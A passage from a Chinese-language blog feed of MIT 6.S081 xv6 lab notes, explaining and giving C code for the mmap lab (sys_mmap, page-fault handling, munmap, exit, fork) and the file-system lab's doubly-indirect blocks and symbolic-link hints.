title="sys_mmap"></a>sys_mmap</h2><p>开始写<code>mmap</code>函数</p><ol><li>这玩意的作用就是只申请一个虚拟地址空间，但是不直接分配物理地址。在申请完之后，就将相关的东西存在proc的VMA数组中去</li><li>有几个情况需要特判<ol><li>如果文件不可读，那么就不能用<code>MAP_SHARED</code>，因为这种模式在之后会写入到磁盘</li><li>地址不够了，即<code>p-&gt;sz&gt;MAXVA</code></li></ol></li><li>注意点<ol><li>只分配虚拟内存，不增加物理内存，就是通过只增加<code>p-&gt;sz</code>而不真正的映射实现的。包括页表中都没有相关的记录</li><li>用<code>argfd</code>取出文件指针</li><li>记得用<code>filedup</code>增加文件的引用计数</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64<br><span class="hljs-title function_">sys_mmap</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    uint64 addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-type">int</span> length, prot, flags, offest;<br>    uint64 erro = <span class="hljs-number">0xffffffffffffffff</span>;<br><br>    <span class="hljs-comment">// 取出参数</span><br>    <span class="hljs-keyword">if</span> (argaddr(<span class="hljs-number">0</span>, &amp;addr) &lt; <span class="hljs-number">0</span> || argint(<span class="hljs-number">1</span>, &amp;length) &lt; <span class="hljs-number">0</span><br>        || argint(<span class="hljs-number">2</span>, &amp;prot) &lt; <span class="hljs-number">0</span> || argint(<span class="hljs-number">3</span>, &amp;flags) &lt; <span class="hljs-number">0</span><br>        || argfd(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, &amp;file) &lt; <span class="hljs-number">0</span> || argint(<span class="hljs-number">5</span>, &amp;offest) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> erro;<br>    &#125;<br>    <span class="hljs-comment">// 权限不对</span><br>    <span class="hljs-keyword">if</span> (file-&gt;writable == <span class="hljs-number">0</span> &amp;&amp; flags == MAP_SHARED &amp;&amp; (prot &amp; PROT_WRITE)) &#123;<br>        <span class="hljs-keyword">return</span> erro;<br>    &#125;<br>    <span class="hljs-comment">// 地址不够了</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>    <span class="hljs-keyword">if</span> (p-&gt;sz + length &gt; MAXVA) &#123;<br>        <span class="hljs-keyword">return</span> erro;<br>    &#125;<br>    <span class="hljs-comment">// 分配地址，找出一个空闲的vma</span><br>    addr = p-&gt;sz;<br>    p-&gt;sz += length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;vmas[i].valid == <span class="hljs-number">0</span>) &#123;<br>            p-&gt;vmas[i].valid = <span class="hljs-number">1</span>;<br>            p-&gt;vmas[i].addr = addr;<br>            p-&gt;vmas[i].flag = flags;<br>            p-&gt;vmas[i].length = length;<br>            p-&gt;vmas[i].prot = prot;<br>            p-&gt;vmas[i].file = file;<br>            filedup(file);<br>            <span class="hljs-keyword">return</span> addr;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> erro;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="usertrap"><a href="#usertrap" class="headerlink" title="usertrap"></a>usertrap</h2><p>修改<code>usertrap</code>函数，使得vma相关的地址能够被正确处理</p><ol><li>首先应该通过<code>r_scause</code>捕获异常</li><li>判断地址的合法性<ol><li>压根不在vma管辖范围内<ol><li>不能超出当前进程的虚拟地址范围，即<code>p-&gt;sz</code></li><li>不能低于栈区</li><li>在进程的vma数组中找不到对应的地址</li></ol></li><li>权限合法性<ol><li>通过<code>r_scause</code>可以知道当前是读还是写操作，通过文件的类型，可以确定是否有这个权限</li></ol></li></ol></li><li><code>kalloc</code>分配一个物理页面</li><li><code>readi</code>将文件的内容读入物理页面，其中偏移部分通过当前地址和vma记录的addr做差值得到，因为一读就是一个页面，因此还要将这个偏移向PGSIZE舍入</li><li>将映射关系通过<code>uvmmap</code>写入到页表</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (r_scause() == <span class="hljs-number">13</span> || r_scause() == <span class="hljs-number">15</span>) &#123;<br>        <span class="hljs-comment">// #ifdef LAB_MMAP</span><br>        <span class="hljs-keyword">if</span> (mmap_handler(r_stval(), r_scause()) == <span class="hljs-number">-1</span>) &#123;<br>            p-&gt;killed = <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-comment">// #endif</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((which_dev = devintr()) != <span class="hljs-number">0</span>) &#123;<br>    <br>    <br><span class="hljs-type">int</span> mmap_handler(uint64 va, uint64 r_cause) &#123;<br>    <span class="hljs-keyword">struct</span> proc *p = myproc();<br>    <span class="hljs-comment">// 地址不合法</span><br>    <span class="hljs-keyword">if</span> (va &gt;= p-&gt;sz || va &lt; p-&gt;trapframe-&gt;sp) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 是否和vma有关系</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;vmas[i].valid == <span class="hljs-number">1</span> &amp;&amp; (va &gt;= p-&gt;vmas[i].addr &amp;&amp; va &lt; p-&gt;vmas[i].addr + p-&gt;vmas[i].length)) &#123;<br>            vma = &amp;p-&gt;vmas[i];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 和vma没关系</span><br>    <span class="hljs-keyword">if</span> (vma == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 和vma是有关的</span><br>    <span class="hljs-comment">// 看看权限是否正确</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> vma-&gt;file;<br>    <span class="hljs-comment">// 不能读，但是你读了</span><br>    <span class="hljs-keyword">if</span> (!file-&gt;readable &amp;&amp; r_cause == <span class="hljs-number">13</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 不能写，但是你写了</span><br>    <span class="hljs-keyword">if</span> (!file-&gt;writable &amp;&amp; r_cause == <span class="hljs-number">15</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 构建pte的标志位</span><br>    <span class="hljs-type">int</span> pte_flag = PTE_U;<br>    <span class="hljs-keyword">if</span> (vma-&gt;prot &amp; PROT_READ) &#123;<br>        pte_flag |= PTE_R;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (vma-&gt;prot &amp; PROT_WRITE) &#123;<br>        pte_flag |= PTE_W;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (vma-&gt;prot &amp; PROT_EXEC) &#123;<br>        pte_flag |= PTE_X;<br>    &#125;<br>    <span class="hljs-comment">// 先分配一个物理页面</span><br>    uint64 pa = (uint64)kalloc();<br>    <span class="hljs-keyword">if</span> (pa == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)pa, <span class="hljs-number">0</span>, PGSIZE);<br>    <span class="hljs-comment">// 成功分配物理页面，从文件中读</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">ip</span> =</span> file-&gt;ip;<br>    ilock(ip);<br>    <span class="hljs-comment">// 读取失败</span><br>    <span class="hljs-keyword">if</span> (readi(ip, <span class="hljs-number">0</span>, pa, PGROUNDDOWN(va - vma-&gt;addr), PGSIZE) == <span class="hljs-number">0</span>) &#123;<br>        iunlock(ip);<br>        kfree((<span class="hljs-type">void</span> *)pa);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    iunlock(ip);<br>    <span class="hljs-comment">// 加入映射</span><br>    <span class="hljs-keyword">if</span> (mappages(p-&gt;pagetable, PGROUNDDOWN(va), PGSIZE, pa, pte_flag) != <span class="hljs-number">0</span>) &#123;<br>        kfree((<span class="hljs-type">void</span> *)pa);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h2><blockquote><p>lab对munmap的情况做了简化，只会从头开始unmap，因此在将数据写回磁盘时，直接调用filewrite函数，它在内部会自动调用file的偏移</p></blockquote><p>munmap就是取消某部分虚拟地址的mmap</p><ol><li>在进程的vma数组找到对应的vma</li><li>更新vma中的addr和length，如果当前length&#x3D;0，说明全部被写入了，那么就通过fileclose关闭这个文件，并且将这个vma的valid修改为0。这个关闭的操作最好放到最后，因为我们可能在第3步还要写这个文件</li><li>如果需要写入，则通过filewrite函数写入磁盘，这个函数的参数很简单，第一个是文件的指针，第二个是起始的虚拟地址，第三个是length</li><li>将进程的页表给<code>uvmunmap</code>掉，因为lab的仁慈，这里的参数传递也很简单，addr全都是PGSIZE的倍数</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64<br><span class="hljs-title function_">sys_munmap</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    uint64 addr;<br>    <span class="hljs-type">int</span> length;<br>    <span class="hljs-keyword">if</span> (argaddr(<span class="hljs-number">0</span>, &amp;addr) &lt; <span class="hljs-number">0</span> || argint(<span class="hljs-number">1</span>, &amp;length) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 先找到对应vma</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;vmas[i].valid == <span class="hljs-number">1</span> &amp;&amp; (addr &gt;= p-&gt;vmas[i].addr &amp;&amp; addr &lt; p-&gt;vmas[i].addr + p-&gt;vmas[i].length)) &#123;<br>            vma = &amp;p-&gt;vmas[i];<br>            <span class="hljs-comment">// 头部</span><br>            <span class="hljs-keyword">if</span> (vma-&gt;addr == addr) &#123;<br>                vma-&gt;addr += length;<br>                vma-&gt;length -= length;<br>                <span class="hljs-comment">// 尾部</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (addr + length == vma-&gt;addr + vma-&gt;length) &#123;<br>                vma-&gt;length -= length;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (vma == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果是shared，需要先写回磁盘</span><br>    <span class="hljs-keyword">if</span> (vma-&gt;flag == MAP_SHARED) &#123;<br>        filewrite(vma-&gt;file, addr, length);<br>    &#125;<br>    <span class="hljs-comment">// 修改页表</span><br>    uvmunmap(p-&gt;pagetable, addr, length / PGSIZE, <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//如果map区域为0</span><br>    <span class="hljs-keyword">if</span> (vma-&gt;length == <span class="hljs-number">0</span>) &#123;<br>        fileclose(vma-&gt;file);<br>        vma-&gt;valid = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有几个小补丁要打，分别是<code>uvmunmap</code>和<code>uvmcopy</code>，它们在查找页表的时候，如果发现pte无效，会panic，这里直接忽略，因为可能是mmap还没有分配物理地址的区域</p><h2 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h2><p>这个函数是用于进程死亡时，就所有的mmap区域都给删掉</p><ol><li>遍历进程的所有vma</li><li>如果vma有效<ol><li>如果需要写入磁盘，那就写入磁盘</li><li>更新页表</li><li>关闭文件</li><li>设置vma无效</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 将所有的映射区取消</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (p-&gt;vmas[i].valid) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> *<span class="hljs-title">vma</span> =</span> &amp;p-&gt;vmas[i];<br>        <span class="hljs-keyword">if</span> (vma-&gt;flag == MAP_SHARED) &#123;<br>            filewrite(vma-&gt;file, vma-&gt;addr, vma-&gt;length);<br>        &#125;<br>        fileclose(vma-&gt;file);<br>        vma-&gt;valid = <span class="hljs-number">0</span>;<br>        uvmunmap(p-&gt;pagetable, vma-&gt;addr, vma-&gt;length / PGSIZE, <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><p>这个函数主要用于子进程将父进程的mmap区域都给拷贝过来，要不然子进程一旦访问还没有分配物理地址的mmap区域，在usertrap里就不能正确处理它了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 将父进程的mmap也拷贝给它</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> *<span class="hljs-title">vma</span> =</span> &amp;p-&gt;vmas[i];<br>    <span class="hljs-keyword">if</span> (vma-&gt;valid) &#123;<br>        memmove(&amp;np-&gt;vmas[i], vma, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> vma));<br>        filedup(vma-&gt;file);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab9</title>
    <link href="/2023/08/29/6-s081-lab9/"/>
    <url>/2023/08/29/6-s081-lab9/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204724.png" alt="20231224204724"><br>@[toc]</p><h1 id="Large-files"><a href="#Large-files" class="headerlink" title="Large files"></a>Large files</h1><p>目标：11+256+256*256个block</p><p>inode的格式在<code>fs.h</code>的<code>struct dinode</code>中被定义，你需要特别注意以下几点</p><ol><li><code>NDIRECT</code></li><li><code>NINDIRECT</code></li><li><code>MAXFILE</code></li><li><code>addrs[]</code></li></ol><p>在磁盘上找一个文件数据是通过<code>fs.c</code>中的<code>bmap()</code>实现的</p><ol><li>无论是读还是写文件，都调用了<code>bmap</code></li><li>在写文件时，<code>bmap()</code>分配了新的block去容纳文件内容，在必要的时候，会去分配一个非直接映射块</li></ol><p><code>bmap</code>处理了两种块号</p><ol><li><code>bn</code>参数是一个逻辑块号，是在一个文件中相对于文件起始位置的块号</li><li>而<code>ip-&gt;addrs[]</code>和<code>bread()</code>的参数中的块号，都是磁盘块号</li><li>你可以将<code>bmap</code>看做是逻辑块号到物理块号的映射</li></ol><h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><ol><li>修改<code>bmap</code>使其通过<code>addrs[]</code>支持11+256+256*256个磁盘块</li><li>如果能通过<code>bigfile</code>和<code>usertests</code>测试，就说明成功</li></ol><h2 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h2><ol><li>保证你理解了<code>bmap()</code>。画图理清楚inode中不同类型的块的指向和作用</li><li>想一下你如何通过逻辑块号索引一级地址块和直接地址块</li><li>如果你改变了<code>NDIRECT</code>，你可能需要去改变<code>file.h</code>中<code>struct inode</code>中的<code>addrs[]</code>的声明。保证<code>struct inode</code>和<code>struct dinode</code>在addrs数组中有相同数量的元素</li><li>如果你改变了<code>NDIRECT</code>的定义，保证你创造了一个新的<code>fs.img</code>，即make clean 然后make qemu</li><li>对任何一个block进行<code>bread</code>之后都要记得<code>brelse</code></li><li>你应该只在必要的时候分配一级地址和二级地址</li><li>保证<code>itrunc</code>将一个文件所有的block都free了，包括新增的二级地址</li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>文件系统这一块，感觉学的很难，各种函数很多，但是这个task这一块是不太难，不过我也做了好久。。。</p><p>这个task只需要修改<code>bmap</code>和<code>itrunc</code>两个函数，以及一些宏常量，之所以只修改这么点东西就可以给一个文件扩容，应该是因为其他函数都是通过<code>bmap</code>来获取逻辑块对应的物理块号的，它们只负责要和写，根本不管到底使用了多少block</p><p>首先，需要修改一些宏常量，并且将<code>dinode</code>和<code>inode</code>的<code>addrs</code>数组长度修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NDIRECT 11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NINDIRECT (BSIZE / sizeof(uint))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N2INDIRECT (NINDIRECT * NINDIRECT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXFILE (NDIRECT + NINDIRECT + N2INDIRECT)</span><br><br>uint addrs[NDIRECT + <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p>然后，修改bitmap函数，首先可以看一下bitmap如何处理直接地址和一级地址，学习一下基本的思路，我们这里基本就是嵌套一下一级地址的情况。</p><p>具体实现如下：</p><ol><li><p>首先，将逻辑块号减去一级地址的块数</p></li><li><p>然后这里使用了一个search函数</p><p> <code>uint search(struct inode *ip, uint index, uint bn, uint *addrs)</code></p><p> 这个函数的意思是，目前寻找的文件的inode是ip，现在要去addrs数组的index项指向的那个多级地址块上的第bn个block的地址，如果第bn块处没有地址，那么就创建一个。所以这个本质上就是一个一级地址的情况，通过两次调用这个函数，就可以完成我们二级地址的查找</p></li></ol><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c">uint <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *ip, uint index, uint bn, uint *addrs)</span> &#123;<br>    uint addr, *a;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">bp</span>;</span><br>    <span class="hljs-keyword">if</span> ((addr = addrs[index]) == <span class="hljs-number">0</span>) &#123;<br>        addrs[index] = addr = balloc(ip-&gt;dev);<br>    &#125;<br>    bp = bread(ip-&gt;dev, addr);<br>    a = (uint *)bp-&gt;data;<br>    <span class="hljs-keyword">if</span> ((addr = a[bn]) == <span class="hljs-number">0</span>) &#123;<br>        a[bn] = addr = balloc(ip-&gt;dev);<br>        log_write(bp);<br>    &#125;<br>    brelse(bp);<br>    <span class="hljs-keyword">return</span> addr;<br>&#125;<br><br><span class="hljs-type">static</span> uint<br><span class="hljs-title function_">bmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *ip, uint bn)</span> &#123;<br>    uint addr, *a;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">bp</span>;</span><br><br>    <span class="hljs-keyword">if</span> (bn &lt; NDIRECT) &#123;<br>        <span class="hljs-keyword">if</span> ((addr = ip-&gt;addrs[bn]) == <span class="hljs-number">0</span>)<br>            ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);<br>        <span class="hljs-keyword">return</span> addr;<br>    &#125;<br>    bn -= NDIRECT;<br><br>    <span class="hljs-keyword">if</span> (bn &lt; NINDIRECT) &#123;<br>        <span class="hljs-comment">// Load indirect block, allocating if necessary.</span><br>        <span class="hljs-keyword">if</span> ((addr = ip-&gt;addrs[NDIRECT]) == <span class="hljs-number">0</span>)<br>            ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);<br>        bp = bread(ip-&gt;dev, addr);<br>        a = (uint *)bp-&gt;data;<br>        <span class="hljs-keyword">if</span> ((addr = a[bn]) == <span class="hljs-number">0</span>) &#123;<br>            a[bn] = addr = balloc(ip-&gt;dev);<br>            log_write(bp);<br>        &#125;<br>        brelse(bp);<br>        <span class="hljs-keyword">return</span> addr;<br>    &#125;<br>    bn -= NINDIRECT;<br><br>    <span class="hljs-keyword">if</span> (bn &lt; N2INDIRECT) &#123;<br>        <span class="hljs-type">int</span> index = bn / NINDIRECT;<br>        <span class="hljs-type">int</span> nbn = bn % NINDIRECT;<br>        addr = search(ip, NDIRECT + <span class="hljs-number">1</span>, index, ip-&gt;addrs);<br>        bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT + <span class="hljs-number">1</span>]);<br>        addr = search(ip, index, nbn, (uint *)bp-&gt;data);<br>        brelse(bp);<br>        <span class="hljs-keyword">return</span> addr;<br>    &#125;<br><br>    panic(<span class="hljs-string">&quot;bmap: out of range&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Symbolic-links"><a href="#Symbolic-links" class="headerlink" title="Symbolic links"></a>Symbolic links</h1><h2 id="task-1"><a href="#task-1" class="headerlink" title="task"></a>task</h2><ol><li>增加一个系统调用<code>symlink(char *target, char *path)</code></li><li>需要通过<code>symlinktest</code>，<code>usertests</code></li></ol><h2 id="hints-1"><a href="#hints-1" class="headerlink" title="hints"></a>hints</h2><ol><li><p>增加系统调用的流程</p><ol><li>Makefile，加入的不是<code>symlink</code>，而是<code>symlinktest</code></li><li>user&#x2F;usys.pl</li><li>user&#x2F;user.h</li><li>kernel&#x2F;sysfile.c</li><li>syscall.h &amp;&amp; syscall.c</li></ol></li><li><p>在<code>kernel/stat.h</code>中增加一个新的文件类型<code>T_SYMLINK</code>代表软链接</p></li><li><p>在<code>kernel/fcntl.h</code>中增加一个标志位<code>O_NOFOLLOW</code>，因为open文件的标志位是or起来的，因此你不能和已有的发生重叠</p></li><li><p>你需要找一个位置去存储软链接的目标地址，例如在<code>inode数据块</code></p><p> <code>symlink</code>应该返回0表示成功，返回-1表示失败</p></li><li><p>修改<code>open</code>系统调用去处理一个路径指向软链接的情况</p><p> 如果文件不存在，open必须失败</p><p> 当一个进程在open中指定了<code>O_NOFOLLOW</code>，则说明不是打开target，而是打开软链接</p></li><li><p>如果被链接的文件也是一个软链接，你必须递归地访问，直到访问一个正确的文件</p><p> 你可以定义最大递归的层数，比如10</p></li><li><p>Other system calls (e.g., link and unlink) must not follow symbolic links; these system calls operate on the symbolic link itself.</p></li><li><p>你不需要处理软链接到目录的情况</p></li></ol><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>这玩意看着很抽象，但是其实搞清楚以下几件事就行了</p><ol><li><p>访问文件就是先访问得到inode，然后通过inode去写对应的文件</p><p> 通过readi就可以读取path对应的inode</p><p> 通过writei就可以在inode对应的文件中去写</p></li><li><p>软链接的作用</p><p> 